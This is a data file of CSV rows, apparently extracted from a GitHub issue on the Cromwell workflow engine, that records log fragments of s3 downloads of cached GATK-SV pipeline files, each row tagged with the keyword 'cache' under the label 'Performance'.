s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-125/cacheCopy/SR00c.NA19102.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-125/cacheCopy/SR00c.NA19102.txt.gz; 1608597413700,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-143/cacheCopy/SR00c.NA20321.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:128495,cache,cacheCopy,128495,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-52/cacheCopy/SR00c.HG02221.txt.gz.tbi; 1608597324182,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-113/cacheCopy/SR00c.NA18549.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-113/cacheCopy/SR00c.NA18549.txt.gz; 1608597327069,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-110/cacheCopy/SR00c.NA18507.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-110/cacheCopy/SR00c.NA18507.txt.gz; 1608597328928,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-136/cacheCopy/SR00c.NA19684.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:105412,cache,cacheCopy,105412,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-54/cacheCopy/SR00c.HG02272.txt.gz; 1608597443863,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-54/cacheCopy/SR00c.HG02272.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-54/cacheCopy/SR00c.HG02272.txt.gz.tbi; 1608597446991,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-4/cacheCopy/SR00c.HG00150.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-4/cacheCopy/SR00c.HG00150.txt.gz; 1608597448688,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-17/cacheCopy/SR00c.HG00701.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:139110,cache,cacheCopy,139110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-56/cacheCopy/SR00c.HG02299.txt.gz.tbi; 1608596998999,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-133/cacheCopy/SR00c.NA19661.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-133/cacheCopy/SR00c.NA19661.txt.gz; 1608597001436,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-108/cacheCopy/SR00c.NA12872.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-108/cacheCopy/SR00c.NA12872.txt.gz; 1608597003743,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-129/cacheCopy/SR00c.NA19351.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:17529,cache,cacheCopy,17529,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-63/cacheCopy/SR00c.HG02586.txt.gz.tbi; 1608597367102,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-123/cacheCopy/SR00c.NA19035.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-123/cacheCopy/SR00c.NA19035.txt.gz; 1608597369233,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-101/cacheCopy/SR00c.HG04161.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-101/cacheCopy/SR00c.HG04161.txt.gz.tbi; 1608597371711,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-48/cacheCopy/SR00c.HG02020.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:116632,cache,cacheCopy,116632,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz.tbi; 1608597552897,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-141/cacheCopy/SR00c.NA20126.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-141/cacheCopy/SR00c.NA20126.txt.gz; 1608597554503,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-149/cacheCopy/SR00c.NA20764.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-149/cacheCopy/SR00c.NA20764.txt.gz.tbi; 1608597557397,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-59/cacheCopy/SR00c.HG02374.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:171783,cache,cacheCopy,171783,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-71/cacheCopy/SR00c.HG02953.txt.gz.tbi; 1608597597343,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz; 1608597600688,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-116/cacheCopy/SR00c.NA18638.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-116/cacheCopy/SR00c.NA18638.txt.gz; 1608597602076,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-20/cacheCopy/SR00c.HG01060.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:182965,cache,cacheCopy,182965,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-83/cacheCopy/SR00c.HG03476.txt.gz.tbi; 1608597201756,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-129/cacheCopy/SR00c.NA19351.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-129/cacheCopy/SR00c.NA19351.txt.gz; 1608597204085,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-147/cacheCopy/SR00c.NA20522.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-147/cacheCopy/SR00c.NA20522.txt.gz; 1608597206512,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-13/cacheCopy/SR00c.HG00457.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:72371,cache,cacheCopy,72371,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-97/cacheCopy/SR00c.HG03872.txt.gz.tbi; 1608597162870,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz; 1608597164800,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz.tbi; 1608597167270,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-152/cacheCopy/SR00c.NA20869.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:61794,cache,cacheCopy,61794,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-1/cacheCopy/SR00c.HG00096.txt.gz.tbi; 1608597421803,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-123/cacheCopy/SR00c.NA19035.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-123/cacheCopy/SR00c.NA19035.txt.gz.tbi; 1608597424089,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-25/cacheCopy/SR00c.HG01344.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-25/cacheCopy/SR00c.HG01344.txt.gz; 1608597426322,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-139/cacheCopy/SR00c.NA19818.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:132246,cache,cacheCopy,132246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-100/cacheCopy/SR00c.HG04158.txt.gz.tbi; 1608597468522,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-19/cacheCopy/SR00c.HG00844.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-19/cacheCopy/SR00c.HG00844.txt.gz.tbi; 1608597470124,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-44/cacheCopy/SR00c.HG01982.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-44/cacheCopy/SR00c.HG01982.txt.gz.tbi; 1608597472441,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-65/cacheCopy/SR00c.HG02611.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4e",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:145970,cache,cacheCopy,145970,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
